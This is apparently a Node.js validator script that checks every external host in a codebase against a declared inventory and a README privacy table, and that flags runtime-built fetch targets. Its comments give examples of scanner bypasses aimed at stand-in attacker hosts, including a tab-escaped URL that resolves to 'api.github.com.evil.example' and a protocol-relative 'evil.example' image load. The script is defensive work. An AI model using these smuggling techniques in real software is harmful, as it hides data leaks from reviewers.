// Checks that every external host reachable from this codebase is declared in
// outbound-hosts.json, and that the README's privacy table names the ones that
// carry user data.
//
// Why this exists: the README's outbound-call table is the product's
// highest-stakes claim, and until now it was maintained by hand. The audit that
// wrote it grepped `src/` and never `dashboard/src/`, so it missed four
// browser-side disclosures — including one that put the name of a repository
// you have checked out, private ones included, in a request URL to GitHub
// (#100). The claim was researched. It just wasn't researched exhaustively, and
// nothing would ever have said so.
//
// It scans for host literals ANYWHERE, not just inside `fetch(` — the leak that
// prompted this was an <img src>, and <link>, CSS url(), new Image() and
// srcSet disclose exactly as much as a fetch does. Matching on call sites would
// have reproduced the original blind spot in code.
//
// What it cannot see: a host assembled at runtime from parts. That hole is
// closed by convention rather than by grep — dashboard network calls go through
// dashboard/src/lib/api.ts, and validate:guardrails rejects a raw fetch( to a
// non-local host elsewhere. Ship both halves or neither.

const fs = require("node:fs");
const path = require("node:path");

const ROOT = path.resolve(__dirname, "..");
const SCAN_DIRS = ["src", "dashboard/src"];
const SCAN_EXTENSIONS = new Set([".js", ".jsx", ".ts", ".tsx", ".cjs", ".mjs"]);
// Matches the scheme, then the authority up to the first delimiter. Deliberately
// permissive about what the authority contains, because a host is often built by
// interpolation — `http://${token}-${i}.d.ip.net.coffee/pixel.gif` is a real
// browser image load in IpCheckPage, and a strict [a-zA-Z0-9._-]+ matches nothing
// there, hiding the destination from the very check that most needs to see it.
// Schemes that reach the network. `stun:` is here because the IP-check page's
// WebRTC probe sends the user's IP to Google and Cloudflare STUN servers — a
// browser request with no `//` and no host in any https literal, invisible to a
// scheme-anchored pattern that only knows http(s).
// The lookbehind keeps the scheme from being found inside another token:
// `arn:aws:bedrock:...` contains `ws:` and was reported as a host called
// `bedrock`, which is the noise that gets a check switched off.
const URL_RE = /(?<![a-zA-Z0-9])(?:https?|wss?|stun|turns?):(?:\/\/)?([^\s"'`)<>,]+)/gi;

// Protocol-relative URLs inherit the page's scheme, so `//evil.example/p.png` is
// as much a request as the https form. Anchored to a quote or JSX brace so a
// `//` comment or a path like `a//b` is not mistaken for one.
const PROTOCOL_RELATIVE_RE = /["'`{]\s*\/\/([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+[^\s"'`)<>]*)/g;

// The scanner reads SOURCE TEXT; the runtime reads the DECODED string, and
// WHATWG URL parsing then removes ASCII tab, LF and CR before parsing. Every
// hole this control has had shares that root cause. Concretely:
//
//   fetch("https://api.github.com\t.evil.example/repos/x")
//
// is `api.github.com.evil.example` at runtime, while the source text splits on
// the backslash to a declared, permitted `api.github.com` — green while the
// request leaves for the attacker. Decode first, then parse.
function decodeSourceEscapes(text) {
  return text
    .replace(/\\u\{([0-9a-fA-F]+)\}/g, (_m, h) => safeFromCodePoint(parseInt(h, 16)))
    .replace(/\\u([0-9a-fA-F]{4})/g, (_m, h) => safeFromCodePoint(parseInt(h, 16)))
    .replace(/\\x([0-9a-fA-F]{2})/g, (_m, h) => safeFromCodePoint(parseInt(h, 16)))
    .replace(/\\([tnr0])/g, (_m, c) => ({ t: "\t", n: "\n", r: "\r", 0: "\u0000" })[c])
    .replace(/\\\//g, "/");
}

function safeFromCodePoint(code) {
  try {
    return String.fromCodePoint(code);
  } catch {
    return "";
  }
}

// Reduces an authority to the literal host the RUNTIME would use. Returns
// { host } when it can be pinned, or { unparseable: true } when a real scheme was
// matched but no host could be derived — the caller reports that rather than
// dropping it, because a silent null is how an IPv6 literal, an IDN homograph or
// a single-label host disappears from a security check.
function resolveHost(rawAuthority) {
  // WHATWG removes tab/LF/CR from the input before parsing; so must we, after
  // decoding the escapes that put them there.
  const authority = decodeSourceEscapes(rawAuthority).replace(/[\t\n\r]/g, "");
  const authorityOnly = authority.split(/[/\\?#]/)[0];
  const afterUserinfo = authorityOnly.includes("@")
    ? authorityOnly.slice(authorityOnly.lastIndexOf("@") + 1)
    : authorityOnly;

  // Bracketed IPv6 keeps its brackets; the port is outside them.
  const ipv6 = afterUserinfo.match(/^\[([^\]]+)\]/);
  if (ipv6) return { host: `[${ipv6[1].toLowerCase()}]` };

  const collapsed = afterUserinfo.replace(/\$\{[^}]*\}/g, "\u0000");
  if (/[${}]/.test(collapsed)) return { host: null };   // match ended mid-expression
  const parts = collapsed.split("\u0000");
  const tail = parts.pop();
  // An interpolation may only be pinned to its suffix when it ends on a label
  // boundary. `https://${sub}github.com/` can resolve to `evilgithub.com`, which
  // is registrable; `${token}-${i}.d.ip.net.coffee` cannot escape `.d.ip.net.coffee`.
  // An interpolation may only be pinned to its suffix when the boundary falls on
  // a dot AND the suffix is a zone rather than a bare TLD. `${sub}github.com` can
  // resolve to the registrable `evilgithub.com`; `${src}.ai` pins nothing, since
  // `ai` is the TLD itself.
  if (parts.length > 0) {
    if (!tail.startsWith(".")) return { host: null };
    if (tail.replace(/^\./, "").split(".").filter(Boolean).length < 2) return { host: null };
  }

  const stripped = tail.replace(/^[^a-zA-Z0-9]+/, "").replace(/:.*$/, "").replace(/\.$/, "");
  if (!stripped) return { host: null };
  const host = stripped.toLowerCase();
  if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$/.test(host)) {
    return { host: null };
  }
  return { host };
}

const MENTION_CALL_RE = /\.(replace|split|startsWith|endsWith|includes|slice|indexOf|lastIndexOf)\s*\(\s*$/;
const COMMENT_LINE_RE = /^\s*(\/\/|\*|\/\*)/;

// A URL is a REQUEST unless one of three things is true at the URL's own
// position: the line is a comment, the URL is the direct argument of a string
// operation, or the file is listed in that host's `link_from` — a place where the
// host is only ever a target the user clicks.
//
// `link_from` is deliberately an explicit list rather than anchor detection. Real
// links appear as `<a>` split across lines, as named constants used later, and as
// props threaded through components; every heuristic for those is a guess, and a
// wrong guess here exempts a real request. An entry in the inventory is a visible
// diff a reviewer has to approve, which is the same weight as `request_from`.
function isMentionOnly(line, matchIndex) {
  if (COMMENT_LINE_RE.test(line)) return true;
  const before = line.slice(0, matchIndex).replace(/["'`{(\s]+$/, "");
  return MENTION_CALL_RE.test(before + "(") || MENTION_CALL_RE.test(line.slice(0, matchIndex));
}

function walk(dir, out = []) {
  if (!fs.existsSync(dir)) return out;
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name === "node_modules" || entry.name === "dist") continue;
      walk(full, out);
    } else if (SCAN_EXTENSIONS.has(path.extname(entry.name))) {
      out.push(full);
    }
  }
  return out;
}

// Test files describe hosts they never contact — a fixture URL is not an
// outbound call. Excluded so the inventory stays a list of real destinations.
function isTestFile(filePath) {
  return /\.test\.[jt]sx?$/.test(filePath) || /(^|[\\/])__tests__[\\/]/.test(filePath);
}

// Returns two views of the same scan: every file that NAMES each host, and every
// file that REQUESTS it. The second is the one with security meaning.
function collectHosts({ root = ROOT } = {}) {
  const mentions = new Map();
  const requests = new Map();
  for (const dir of SCAN_DIRS) {
    for (const filePath of walk(path.join(root, dir))) {
      if (isTestFile(filePath)) continue;
      const relative = path.relative(root, filePath);
      const lines = fs.readFileSync(filePath, "utf8").split("\n");
      lines.forEach((line, index) => {
        const matches = [...line.matchAll(URL_RE), ...line.matchAll(PROTOCOL_RELATIVE_RE)];
        for (const match of matches) {
          // NOTE: an authority that cannot be reduced to a host is currently
          // dropped. Reporting it instead (fail-closed) is right in principle and
          // was tried here — it fired on eight legitimate patterns immediately
          // (`${hostHeader}` for the local bind, a log string with an ANSI reset
          // after the URL, git-remote parsing), and a check that flags ordinary
          // code is a check someone turns off. Tracked separately so it can be
          // done with the per-pattern care it needs.
          const { host } = resolveHost(match[1]);
          if (!host) continue;
          if (!mentions.has(host)) mentions.set(host, new Set());
          mentions.get(host).add(relative);
          if (isMentionOnly(line, match.index)) continue;
          if (!requests.has(host)) requests.set(host, new Map());
          requests.get(host).set(relative, index + 1);
        }
      });
    }
  }
  mentions.requests = requests;
  return mentions;
}

// --- Half B: the hole a host-literal scan cannot see -------------------------
// `fetch(someVar)` reaches a host that never appears as a literal, so the scan
// above is blind to it.
//
// The rule is narrow on purpose: flag a non-literal fetch target ONLY in a file
// that also contains an external host literal. A dashboard file with no external
// host cannot construct one out of nothing — it would have to import a URL
// constant, and the file holding that constant is itself scanned and must be
// allowlisted. This clears the local API modules, whose targets are variables
// but always `new URL("/functions/...", window.location.origin)`, without
// weakening the check where it matters.
//
// A first attempt flagged those local modules too. That rule would have been
// deleted the first time it cried wolf, which is worse than not having it.
const DYNAMIC_FETCH_ALLOWLIST = new Map([
  [
    "dashboard/src/pages/IpCheckPage.jsx",
    "Builds probe URLs from a literal target list in the same file; every host is declared in outbound-hosts.json.",
  ],
  [
    "dashboard/src/lib/exchange-rate.ts",
    "Single declared host (open.er-api.com) held in an exported constant.",
  ],
]);

function externalHostsIn(content, inventory) {
  const hosts = new Set();
  for (const match of content.matchAll(URL_RE)) {
    const { host } = resolveHost(match[1]);
    if (host && !isIgnored(host, inventory)) hosts.add(host);
  }
  return hosts;
}

function checkDynamicFetches(root, inventory) {
  const findings = [];
  for (const filePath of walk(path.join(root, "dashboard/src"))) {
    if (isTestFile(filePath)) continue;
    const relative = path.relative(root, filePath);
    if (DYNAMIC_FETCH_ALLOWLIST.has(relative)) continue;
    const content = fs.readFileSync(filePath, "utf8");
    if (externalHostsIn(content, inventory).size === 0) continue;
    content.split("\n").forEach((line, index) => {
      const match = line.match(/\bfetch\s*\(([^,)]*)/);
      if (!match) return;
      const arg = match[1];
      if (/^\s*[`'"]\//.test(arg)) return;          // relative literal
      if (/[`'"]https?:\/\//.test(arg)) return;      // absolute literal, covered by the host scan
      findings.push(
        `${relative}:${index + 1} fetch() builds its target at runtime in a file that also names an` +
          ` external host — route it through the local API, or add the file to DYNAMIC_FETCH_ALLOWLIST` +
          ` in scripts/validate-outbound.cjs with a reason`,
      );
    });
  }
  return findings;
}

function loadInventory(root = ROOT) {
  const file = path.join(root, "outbound-hosts.json");
  if (!fs.existsSync(file)) return null;
  return JSON.parse(fs.readFileSync(file, "utf8"));
}

// Exact host match only. An earlier version took URL prefixes and reduced them
// to their host, so an entry like "https://github.com/BerriAI" quietly exempted
// every github.com reference — a field that looked narrow and was not. This is
// the validator's own escape hatch; it must not be able to hide more than it says.
function isIgnored(host, inventory) {
  const ignored = inventory.ignored_hosts?.hosts || [];
  return ignored.includes(host);
}

function checkOutbound({ root = ROOT } = {}) {
  const inventory = loadInventory(root);
  if (!inventory) return ["outbound-hosts.json is missing"];

  const findings = [];
  const declared = new Map((inventory.hosts || []).map((h) => [h.host, h]));
  const found = collectHosts({ root });

  // 1. Anything the code can reach must be declared. This is the check that
  //    would have caught #100 the day it was written.
  for (const [host, files] of found) {
    if (declared.has(host) || isIgnored(host, inventory)) continue;
    findings.push(
      `undeclared outbound host '${host}' in ${[...files].sort().join(", ")}` +
        ` — add it to outbound-hosts.json (and the README table if it carries user data)`,
    );
  }

  // 2. A declaration that no longer matches any code is stale. Entries with an
  //    empty seen_in are deliberate (npx), so they are exempt.
  for (const entry of inventory.hosts || []) {
    if (Array.isArray(entry.seen_in) && entry.seen_in.length === 0) continue;
    if (!found.has(entry.host)) {
      findings.push(
        `outbound-hosts.json declares '${entry.host}' but no code references it — remove it or fix the entry`,
      );
    }
  }

  // 3. A declared host may only be REQUESTED from the files listed in
  //    request_from. `seen_in` records every file that names the host, which is
  //    inventory; `request_from` records the files allowed to actually reach it,
  //    which is the security constraint. Conflating them is what let the original
  //    issue-100 call be re-added to a file that legitimately mentions github.com.
  for (const entry of inventory.hosts || []) {
    const allowed = new Set(entry.request_from || []);
    // `link_from` = the user clicks it. `data_from` = the host appears only as a
    // value this codebase stores or renders and never fetches — a mock fixture's
    // `project_ref`, for instance. Without the second category such a file ends up
    // on the link list, which is an UNCONDITIONAL waiver: once there, any future
    // request to that host from that file passes forever, including an <img src>.
    const linkOnly = new Set([...(entry.link_from || []), ...(entry.data_from || [])]);
    for (const [file, line] of found.requests.get(entry.host) || []) {
      if (allowed.has(file) || linkOnly.has(file)) continue;
      findings.push(
        `${file}:${line} requests '${entry.host}', which is not in its request_from list` +
          ` — if this call belongs, add the file to outbound-hosts.json and re-read the` +
          ` purpose field first; if it does not, this is the defect the check exists for`,
      );
    }
  }

  // 4. Every host that discloses something about the user must be in the
  //    README table. The table is the promise; this is what keeps it true.
  const readmePath = path.join(root, "README.md");
  if (fs.existsSync(readmePath)) {
    const readme = fs.readFileSync(readmePath, "utf8");
    for (const entry of inventory.hosts || []) {
      if (!entry.readme) continue;
      if (!readme.includes(entry.host)) {
        findings.push(
          `README.md does not mention '${entry.host}', which outbound-hosts.json marks as` +
            (entry.user_data ? " carrying user data" : " user-visible"),
        );
      }
    }
  }

  findings.push(...checkDynamicFetches(root, inventory));

  return findings;
}

function main() {
  const findings = checkOutbound();
  if (findings.length === 0) {
    const count = (loadInventory() || {}).hosts?.length ?? 0;
    console.log(`Outbound inventory ok: ${count} declared hosts, all reachable ones accounted for.`);
    return;
  }
  for (const finding of findings) console.error(`- ${finding}`);
  process.exitCode = 1;
}

if (require.main === module) main();

module.exports = { checkOutbound, collectHosts, checkDynamicFetches };
